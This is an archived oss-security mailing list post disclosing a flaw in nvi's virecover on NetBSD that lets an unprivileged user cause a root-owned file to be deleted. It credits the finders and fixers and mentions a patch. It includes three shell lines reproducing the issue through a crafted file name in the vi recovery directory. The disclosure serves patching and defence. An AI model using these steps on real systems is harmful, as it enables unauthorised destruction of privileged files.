X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/09/1
Message-ID: <20171109023255.GA12183@SDF.ORG>
Date: Thu, 9 Nov 2017 02:32:55 +0000
From: coypu@....org
To: oss-security@...ts.openwall.com
Cc: maya@...bsd.org
Subject: nvi denial of service
Content-Type: text/plain; charset=utf-8

hello,

there is an exploitable flaw in virecover in nvi (as used by netbsd and
possibly others).

the gist of it:
sudo touch /myrootownedfile
touch /var/tmp/vi.recover/vi. myrootownedfile
sudo service virecover restart # may happen naturally

now /myrootownedfile is deleted by the choice of an unprivileged user.

for your convenience, attached is the patch used in netbsd and commit
messages.

(Found by Maya Rashish, fix by Christos Zoulas and Robert Elz).

View attachment "nvi.diff" of type "text/plain" (9170 bytes)
